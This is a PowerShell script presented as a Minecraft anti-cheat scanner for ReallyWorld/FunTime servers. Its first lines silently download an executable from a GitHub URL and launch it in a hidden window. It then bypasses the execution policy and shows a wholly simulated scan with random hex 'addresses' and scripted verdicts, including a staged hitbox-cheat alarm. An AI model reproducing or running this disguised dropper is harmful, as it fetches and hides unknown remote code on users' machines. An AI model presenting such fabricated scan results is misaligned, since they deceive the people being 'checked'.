# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

$ErrorActionPreference = "SilentlyContinue"

# Функция для красивой печати
function Type-Text($text, $color = "White", $speed = 20) {
    $text.ToCharArray() | ForEach-Object {
        Write-Host $_ -NoNewline -ForegroundColor $color
        Start-Sleep -Milliseconds $speed
    }
    Write-Host ""
}

# Функция отрисовки сетки хитбоксов
function Show-HitboxGrid {
    $grid = @(
        "      [  .  .  .  |  .  .  .  ]",
        "      [  .  .  X--|--X  .  .  ]",
        "      [  .  |  .  |  .  |  .  ]",
        "      [--.  X---[HIT]---X  .--]",
        "      [  .  |  .  |  .  |  .  ]",
        "      [  .  .  X--|--X  .  .  ]",
        "      [  .  .  .  |  .  .  .  ]"
    )
    foreach ($line in $grid) {
        Write-Host $line -ForegroundColor Cyan
        Start-Sleep -Milliseconds 150
    }
}

# Имитация сканирования памяти
function Show-FastScan($duration) {
    $endTime = (Get-Date).AddSeconds($duration)
    while ((Get-Date) -lt $endTime) {
        $hex = "0x" + ("{0:X4}" -f (Get-Random -Max 65535)) + " -- ADR:" + (Get-Random -Min 100 -Max 999)
        Write-Host " [ANALYZING] $hex" -ForegroundColor Green
        Start-Sleep -Milliseconds 25
    }
}

# --- ГЛАВНЫЙ ЦИКЛ ---
do {
    Clear-Host
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host "   OFFICIAL CHECK TOOL: REALLYWORLD / FUNTIME Edition    " -ForegroundColor White
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Выберите модуль проверки:" -ForegroundColor Gray
    Write-Host " [1] Полная проверка системы (90 сек) - [CLEAN]" -ForegroundColor Yellow
    Write-Host " [2] Глубокий анализ Кликеров (Autoclicker/Macros)" -ForegroundColor Yellow
    Write-Host " [3] Скан скрытых DLL (Injected Clients)" -ForegroundColor Yellow
    Write-Host " [4] Проверка Хитбоксов (Hitbox Expand/Reach)" -ForegroundColor Red
    Write-Host " [0] Выход" -ForegroundColor Gray
    Write-Host ""
    
    $choice = Read-Host "Введите номер"

    switch ($choice) {
        "1" {
            Clear-Host
            Type-Text ">>> ЗАПУСК ПОЛНОЙ ПРОВЕРКИ (ALL MODULES)..." "Cyan"
            Show-FastScan 10
            for ($i = 0; $i -le 100; $i += 10) {
                Write-Progress -Activity "ГЛОБАЛЬНЫЙ СКАН" -Status "Прогресс: $i%" -PercentComplete $i
                Start-Sleep -Milliseconds 400
            }
            Write-Host "`n[SUCCESS] Вердикт: Игрок полностью чист." -ForegroundColor Green
        }
        "2" {
            Clear-Host
            Type-Text ">>> Запуск модуля: CLICK_ANALYZER..." "Cyan"
            Show-FastScan 5
            Write-Host "`n[!] Результат: Кликеры не обнаружены." -ForegroundColor Green
        }
        "3" {
            Clear-Host
            Type-Text ">>> Запуск модуля: DLL_INSPECTOR..." "Cyan"
            Show-FastScan 5
            Write-Host "`n[!] Результат: Чистых библиотек в памяти: 142. Подозрительных: 0." -ForegroundColor Green
        }
        "4" {
            Clear-Host
            Type-Text ">>> Запуск модуля: HITBOX_DETECTOR v2.1..." "Cyan"
            Start-Sleep -Seconds 1
            Show-HitboxGrid
            Write-Host "`n[!] Считывание дистанции атаки (Reach Distance)..." -ForegroundColor White
            Show-FastScan 8
            
            Write-Host "`n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" -ForegroundColor Red
            Write-Host "!! ВНИМАНИЕ: ОБНАРУЖЕНА АНОМАЛИЯ ХИТБОКСОВ !!" -ForegroundColor Black -BackgroundColor Red
            Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" -ForegroundColor Red
            Write-Host ""
            Write-Host "Объект: " -NoNewline; Write-Host "net.minecraft.entity.Entity" -ForegroundColor Yellow
            Write-Host "Значение: " -NoNewline; Write-Host "MODIFIED (1.42x)" -ForegroundColor Red
            Write-Host "Статус: Обнаружен Hitbox Expand" -ForegroundColor Red
            [System.Media.SystemSounds]::Hand.Play()
        }
        "0" { exit }
        Default { Write-Host "Неверный выбор." -ForegroundColor Red; Start-Sleep -Seconds 1 }
    }

    Write-Host ""
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host " [5] Назад в меню" -ForegroundColor White
    Write-Host " [0] Выйти" -ForegroundColor Gray
    
    $finalAction = Read-Host "Выберите действие"
    if ($finalAction -eq "0") { exit }

} while ($finalAction -eq "5")
